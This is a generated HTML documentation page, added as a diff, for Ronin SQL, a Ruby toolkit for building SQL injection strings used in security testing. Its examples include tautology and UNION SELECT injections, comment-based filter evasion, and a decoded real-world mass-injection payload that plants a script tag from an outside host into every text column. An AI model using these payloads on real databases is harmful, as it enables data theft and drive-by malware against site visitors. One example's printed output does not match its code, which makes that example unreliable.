@@ -1,0 +1,198 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=US-ASCII" />
+<title>
+  File: README
+  
+    &mdash; Ronin SQL Documentation
+  
+</title>
+
+  <link rel="stylesheet" href="css/style.css" type="text/css" media="screen" charset="utf-8" />
+
+  <link rel="stylesheet" href="css/common.css" type="text/css" media="screen" charset="utf-8" />
+
+<script type="text/javascript" charset="utf-8">
+  hasFrames = window.top.frames.main ? true : false;
+  relpath = '';
+  framesUrl = "frames.html#!" + escape(window.location.href);
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div id="header">
+      <div id="menu">
+  
+    <a href="_index.html">Index</a> &raquo; 
+    <span class="title">File: README</span>
+  
+
+  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
+</div>
+
+      <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="class_list.html">
+      Class List
+    </a>
+  
+    <a class="full_list_link" id="method_list_link"
+        href="method_list.html">
+      Method List
+    </a>
+  
+    <a class="full_list_link" id="file_list_link"
+        href="file_list.html">
+      File List
+    </a>
+  
+</div>
+      <div class="clear"></div>
+    </div>
+
+    <iframe id="search_frame"></iframe>
+
+    <div id="content"><div id='filecontents'><h1 id="ronin-sql">Ronin SQL</h1>
+
+<ul>
+  <li><a href="https://github.com/ronin-ruby/ronin-sql">Source</a></li>
+  <li><a href="https://github.com/ronin-ruby/ronin-sql/issues">Issues</a></li>
+  <li><a href="http://rubydoc.info/github/ronin-ruby/ronin-sql/frames">Documentation</a></li>
+  <li><a href="https://groups.google.com/group/ronin-ruby">Mailing List</a></li>
+  <li><a href="http://webchat.freenode.net/?channels=ronin&amp;uio=Mj10cnVldd">irc.freenode.net #ronin</a></li>
+</ul>
+
+<h2 id="description">Description</h2>
+
+<p><span class='object_link'><a href="Ronin/SQL.html" title="Ronin::SQL (module)">Ronin::SQL</a></span> is a Ruby DSL for crafting SQL Injections (SQLi).</p>
+
+<h3 id="features">Features</h3>
+
+<ul>
+  <li>Provides convenience methods for encoding/decoding SQL data.</li>
+  <li>Provides an Domain Specific Language (DSL) for crafting normal SQL and
+SQL injections.</li>
+</ul>
+
+<h2 id="examples">Examples</h2>
+
+<h3 id="convenience-methods">Convenience Methods</h3>
+
+<p>Escape a String:</p>
+
+<pre class="code ruby"><code><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>O'Brian</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_escape'>sql_escape</span>
+<span class='comment'># =&gt; &quot;'O''Brian'&quot;
+</span></code></pre>
+
+<p>Unescapes a SQL String:</p>
+
+<pre class="code ruby"><code><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>'O''Brian'</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_unescape'>sql_unescape</span>
+<span class='comment'># =&gt; &quot;O'Briand&quot;
+</span></code></pre>
+
+<p>Hex encode a String:</p>
+
+<pre class="code ruby"><code><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exploit</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_sql_encode'>sql_encode</span>
+<span class='comment'># =&gt; &quot;0x6578706c6f6974&quot;
+</span></code></pre>
+
+<p>Hex decode a String:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_string'>string</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72</span><span class='tstring_end'>&quot;</span></span>
+<span class='id identifier rubyid_string'>string</span><span class='period'>.</span><span class='id identifier rubyid_sql_decode'>sql_decode</span>
+<span class='comment'># =&gt; &quot;DECLARE @T varchar(255),@C varchar(4000) DECLARE Table_Cursor CURSOR FOR select a.name,b.name from sysobjects a,syscolumns b where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM  Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@T+'] set ['+@C+']=''\&quot;&gt;&lt;/title&gt;&lt;script src=\&quot;http://www0.douhunqn.cn/csrss/w.js\&quot;&gt;&lt;/script&gt;&lt;!--''+['+@C+'] where '+@C+' not like ''%\&quot;&gt;&lt;/title&gt;&lt;script src=\&quot;http://www0.douhunqn.cn/csrss/w.js\&quot;&gt;&lt;/script&gt;&lt;!--''')FETCH NEXT FROM  Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor&quot;
+</span></code></pre>
+
+<h3 id="sqli-dsl">SQLi DSL</h3>
+
+<p>Injecting a <code>1=1</code> test into a String value:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'>Ronin</span><span class='op'>::</span><span class='const'>SQL</span><span class='op'>::</span><span class='const'>Injection</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='symbol'>:escape</span> <span class='op'>=&gt;</span> <span class='symbol'>:string</span><span class='rparen'>)</span>
+<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_string'>string</span><span class='lparen'>(</span><span class='int'>1</span><span class='rparen'>)</span> <span class='op'>==</span> <span class='id identifier rubyid_string'>string</span><span class='lparen'>(</span><span class='int'>1</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
+<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
+<span class='comment'># 1' OR '1'='1
+</span></code></pre>
+
+<p>Columns:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'>Ronin</span><span class='op'>::</span><span class='const'>SQL</span><span class='op'>::</span><span class='const'>Injection</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_and'>and</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_admin'>admin</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span>
+<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
+<span class='comment'># 1 AND admin=1
+</span></code></pre>
+
+<p>Clauses:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'>Ronin</span><span class='op'>::</span><span class='const'>SQL</span><span class='op'>::</span><span class='const'>Injection</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_or'>or</span> <span class='lbrace'>{</span> <span class='int'>1</span> <span class='op'>==</span> <span class='int'>1</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_limit'>limit</span><span class='lparen'>(</span><span class='int'>0</span><span class='rparen'>)</span>
+<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
+<span class='comment'># 1 AND admin=1
+</span></code></pre>
+
+<p>Statements:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'>Ronin</span><span class='op'>::</span><span class='const'>SQL</span><span class='op'>::</span><span class='const'>Injection</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_union'>union</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='int'>1</span><span class='comma'>,</span><span class='int'>2</span><span class='comma'>,</span><span class='int'>3</span><span class='comma'>,</span><span class='int'>4</span><span class='comma'>,</span><span class='id identifier rubyid_id'>id</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_users'>users</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
+<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span>
+<span class='comment'># 1 UNION SELECT (1,2,3,4,id) FROM users
+</span></code></pre>
+
+<p>Filter evasion:</p>
+
+<pre class="code ruby"><code><span class='id identifier rubyid_sqli'>sqli</span> <span class='op'>=</span> <span class='const'>Ronin</span><span class='op'>::</span><span class='const'>SQL</span><span class='op'>::</span><span class='const'>Injection</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+<span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_union'>union</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_select'>select</span><span class='lparen'>(</span><span class='int'>1</span><span class='comma'>,</span><span class='int'>2</span><span class='comma'>,</span><span class='int'>3</span><span class='comma'>,</span><span class='int'>4</span><span class='comma'>,</span><span class='id identifier rubyid_id'>id</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_from'>from</span><span class='lparen'>(</span><span class='id identifier rubyid_users'>users</span><span class='rparen'>)</span> <span class='rbrace'>}</span>
+<span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_sqli'>sqli</span><span class='period'>.</span><span class='id identifier rubyid_to_sql'>to_sql</span><span class='lparen'>(</span><span class='symbol'>:space</span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>'</span><span class='tstring_content'>/**/</span><span class='tstring_end'>'</span></span><span class='rparen'>)</span>
+<span class='comment'># 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
+</span></code></pre>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li><a href="http://www.ruby-lang.org">Ruby</a> &gt;= 1.9.1</li>
+</ul>
+
+<h2 id="install">Install</h2>
+
+<pre class="code ruby"><code>$ gem install ronin-sql
+</code></pre>
+
+<h2 id="license">License</h2>
+
+<p>Ronin SQL - A Ruby DSL for crafting SQL Injections.</p>
+
+<p>Copyright (c) 2007-2013 Hal Brodigan (postmodern.mod3 at gmail.com)</p>
+
+<p>This file is part of Ronin SQL.</p>
+
+<p>Ronin Asm is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.</p>
+
+<p>Ronin Asm is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.</p>
+
+<p>You should have received a copy of the GNU General Public License
+along with Ronin Asm.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a>.</p>
+
+</div></div>
+
+    <div id="footer">
+  Generated on Mon Jan 21 04:52:49 2013 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.3 (ruby-1.9.3).
+</div>
+
+  </body>
+</html>
